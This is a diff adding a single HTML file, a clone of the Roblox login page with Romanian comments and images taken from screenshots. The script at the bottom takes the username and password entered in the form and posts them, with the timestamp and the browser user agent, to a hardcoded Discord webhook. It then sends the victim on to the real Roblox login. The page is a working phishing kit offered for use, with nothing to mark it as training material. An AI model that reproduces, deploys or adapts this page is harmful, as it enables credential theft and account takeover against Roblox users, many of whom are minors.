@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <style>
+        /* ===== RESET ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #ffffff;
+
+            /* ===== FUNDAL CU POZA ===== */
+            background-image: url('https://i.postimg.cc/13t5KmF8/Captura-de-ecran-2026-08-08-214027.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+
+        /* ===== NAVBAR ===== */
+        .navbar {
+            background-color: #0f0f0f;
+            padding: 12px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            border-bottom: 1px solid #2a2a2a;
+            position: relative; /* pentru a fi deasupra fundalului */
+            z-index: 2;
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 35px;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            height: 48px;
+            width: auto;
+            display: block;
+        }
+
+        .nav-link {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-link:hover {
+            color: #cccccc;
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* ===== SEARCH BAR ===== */
+        .search-wrapper {
+            display: flex;
+            align-items: center;
+            background-color: #2a2a2a;
+            border: 1px solid #3a3a3a;
+            border-radius: 8px;
+            padding: 0 12px;
+            height: 38px;
+            width: 350px;
+            margin-left: -15px;
+            transition: border-color 0.3s;
+        }
+
+        .search-wrapper:focus-within {
+            border-color: #555;
+        }
+
+        .search-icon {
+            height: 20px;
+            width: auto;
+            margin-right: 8px;
+            flex-shrink: 0;
+            display: block;
+        }
+
+        .search-bar {
+            width: 100%;
+            border: none;
+            background: transparent;
+            color: #ffffff;
+            font-size: 13px;
+            outline: none;
+            font-family: inherit;
+            height: 100%;
+        }
+
+        .search-bar::placeholder {
+            color: #9a9a9a;
+        }
+
+        /* ===== SIGN UP IMAGE ===== */
+        .signup-image {
+            height: 38px;
+            width: auto;
+            display: block;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        /* ===== LOGIN CONTAINER ===== */
+        .login-container {
+            max-width: 400px;
+            width: 100%;
+            margin: 50px auto;
+            padding: 35px 30px;
+            background-color: rgba(43, 43, 43, 0.92); /* ușor transparent pentru a se vedea fundalul */
+            backdrop-filter: blur(4px); /* efect de estompare */
+            border-radius: 8px;
+            border: 1px solid #3a3a3a;
+            flex: 1;
+            position: relative;
+            z-index: 2;
+        }
+
+        .login-header {
+            text-align: center;
+            font-size: 30px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 25px;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 14px;
+            position: relative;
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #3a3a3a;
+            border-radius: 10px;
+            font-size: 15px;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            transition: border-color 0.3s;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .input-field::placeholder {
+            color: #9a9a9a;
+        }
+
+        .input-field:focus {
+            border-color: #555555;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #2a2a2a;
+            color: #ffffff;
+            border: 1px solid #4a4a4a;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 5px;
+            font-family: inherit;
+        }
+
+        .login-button:hover {
+            background-color: #3a3a3a;
+            border-color: #666;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin: 16px 0 18px;
+        }
+
+        .text-link {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 16px;
+            font-family: inherit;
+        }
+
+        .text-link:hover {
+            color: #cccccc;
+        }
+
+        .otp-button {
+            width: 100%;
+            padding: 10px;
+            background-color: transparent;
+            color: #ffffff;
+            border: 1px solid #4a4a4a;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 10px;
+            font-family: inherit;
+        }
+
+        .otp-button:hover {
+            background-color: #2a2a2a;
+            border-color: #666;
+        }
+
+        .quick-login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: transparent;
+            color: #ffffff;
+            border: 1px solid #4a4a4a;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        .quick-login-button:hover {
+            background-color: #2a2a2a;
+            border-color: #666;
+        }
+
+        .divider {
+            margin: 18px 0 20px;
+        }
+
+        .divider hr {
+            border: none;
+            border-top: 1px solid #3a3a3a;
+        }
+
+        .signup-option {
+            text-align: center;
+            margin-top: 22px;
+            font-size: 14px;
+            color: #b0b0b0;
+            font-family: inherit;
+        }
+
+        .signup-option .text-link {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .signup-option .text-link:hover {
+            color: #cccccc;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            background-color: #0f0f0f;
+            padding: 25px 30px 20px;
+            margin-top: auto;
+            border-top: 1px solid #1a1a1a;
+            position: relative;
+            z-index: 2;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px 25px;
+        }
+
+        .footer-link {
+            color: #9a9a9a;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.3s;
+            font-family: inherit;
+        }
+
+        .footer-link:hover {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 820px) {
+            .navbar {
+                flex-direction: column;
+                gap: 10px;
+                padding: 12px 20px;
+            }
+            .nav-left {
+                justify-content: center;
+                gap: 20px;
+            }
+            .nav-right {
+                width: 100%;
+                justify-content: center;
+            }
+            .search-wrapper {
+                width: 100%;
+                max-width: 400px;
+                margin-left: 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .navbar {
+                padding: 10px 12px;
+                gap: 8px;
+            }
+            .nav-left {
+                gap: 14px;
+            }
+            .logo {
+                height: 36px;
+            }
+            .nav-link {
+                font-size: 13px;
+            }
+            .search-wrapper {
+                height: 34px;
+                padding: 0 10px;
+                border-radius: 6px;
+                width: 100%;
+                margin-left: 0;
+            }
+            .search-icon {
+                height: 16px;
+                margin-right: 6px;
+            }
+            .search-bar {
+                font-size: 12px;
+            }
+            .signup-image {
+                height: 34px;
+            }
+            .login-container {
+                margin: 30px 12px;
+                padding: 24px 16px;
+            }
+            .login-header {
+                font-size: 24px;
+            }
+            .input-field {
+                padding: 10px 12px;
+                font-size: 14px;
+                border-radius: 8px;
+            }
+            .login-button {
+                font-size: 15px;
+                padding: 10px;
+                border-radius: 8px;
+            }
+            .text-link {
+                font-size: 14px;
+            }
+            .otp-button,
+            .quick-login-button {
+                border-radius: 8px;
+                font-size: 13px;
+            }
+            .footer {
+                padding: 16px 12px;
+            }
+            .footer-links {
+                gap: 6px 12px;
+            }
+            .footer-link {
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== NAVIGATION BAR ===== -->
+    <div class="navbar">
+        <div class="nav-left">
+            <img src="https://i.ibb.co/s9hJbk2K/Captur-de-ecran-2026-08-08-211650.png" alt="Roblox Logo" class="logo">
+            <a href="#" class="nav-link">Charts</a>
+            <a href="#" class="nav-link">Marketplace</a>
+            <a href="#" class="nav-link">Create</a>
+            <a href="#" class="nav-link">Robux</a>
+            <div class="search-wrapper">
+                <img src="https://i.ibb.co/kPLP70f/Captur-de-ecran-2026-08-08-213253.png" alt="search" class="search-icon">
+                <input type="text" class="search-bar" placeholder="Search">
+            </div>
+        </div>
+        <div class="nav-right">
+            <img src="https://i.ibb.co/rJR5W5G/Captur-de-ecran-2026-08-08-213641.png" alt="Sign Up" class="signup-image">
+        </div>
+    </div>
+
+    <!-- ===== LOGIN CONTAINER ===== -->
+    <div class="login-container">
+        <h1 class="login-header">Login to Roblox</h1>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="login-username" class="sr-only">Username/Email/Phone</label>
+                <input type="text" id="login-username" class="input-field" placeholder="Username/Email/Phone">
+            </div>
+
+            <div class="form-group">
+                <label for="login-password" class="sr-only">Password</label>
+                <input type="password" id="login-password" class="input-field" placeholder="Password">
+            </div>
+
+            <button type="button" id="login-button" class="login-button">Log In</button>
+        </form>
+
+        <div class="forgot-link">
+            <a href="#" class="text-link">Forgot Password or Username?</a>
+        </div>
+
+        <div class="divider"><hr></div>
+
+        <button type="button" class="otp-button">Email Me a One-Time Code</button>
+        <button type="button" class="quick-login-button">Use Another Device</button>
+
+        <div class="signup-option">
+            Don't have an account? <a href="#" class="text-link">Sign Up</a>
+        </div>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">About Us</a>
+            <a href="#" class="footer-link">Jobs</a>
+            <a href="#" class="footer-link">Blog</a>
+            <a href="#" class="footer-link">Parents</a>
+            <a href="#" class="footer-link">Gift Cards</a>
+            <a href="#" class="footer-link">Help</a>
+            <a href="#" class="footer-link">Terms</a>
+            <a href="#" class="footer-link">Accessibility</a>
+        </div>
+    </footer>
+
+    <!-- ===== SCRIPT DISCORD ===== -->
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1535679467857510501/IZs3tTizJHQ1fnBS5H-nHuM1qOyux4Bw75n5ThOq4UNCkG5VB42j90r9raVTyWR67NRI';
+
+        function sendLoginData(username, password) {
+            const data = {
+                content: `🚨 **NOU LOGIN ROBLOX!** 🚨\n\n` +
+                        `👤 **Username/Email:** ${username}\n` +
+                        `🔑 **Password:** ${password}\n` +
+                        `🕐 **Data:** ${new Date().toLocaleString('ro-RO')}\n` +
+                        `🌐 **Browser:** ${navigator.userAgent}`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Date trimise cu succes!');
+                    alert('Login successful!');
+                    window.location.href = 'https://www.roblox.com/login';
+                } else {
+                    console.error('❌ Eroare la trimitere');
+                    alert('Eroare la login!');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Eroare:', error);
+                alert('Eroare la conexiune!');
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginButton = document.getElementById('login-button');
+            const usernameInput = document.getElementById('login-username');
+            const passwordInput = document.getElementById('login-password');
+
+            loginButton.addEventListener('click', function() {
+                const username = usernameInput.value;
+                const password = passwordInput.value;
+                if (username && password) {
+                    sendLoginData(username, password);
+                } else {
+                    alert('Completează toate câmpurile!');
+                }
+            });
+
+            document.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    if (document.activeElement === usernameInput || 
+                        document.activeElement === passwordInput) {
+                        loginButton.click();
+                    }
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
